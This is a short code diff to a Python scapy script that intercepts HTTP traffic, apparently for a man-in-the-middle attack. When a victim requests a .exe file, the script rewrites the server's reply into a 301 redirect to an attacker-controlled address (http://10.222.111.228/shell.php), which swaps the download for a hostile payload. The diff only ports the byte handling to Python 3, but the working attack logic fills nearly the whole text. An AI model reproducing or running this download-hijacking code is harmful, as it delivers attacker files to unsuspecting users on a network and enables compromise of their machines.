@@ -37,14 +37,13 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
+            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                 print("[+] .exe Request]")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
-                packet.set_payload(str(scapy_packet))
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.php\n\n")
                 packet.set_payload(bytes(modified_packet))
 
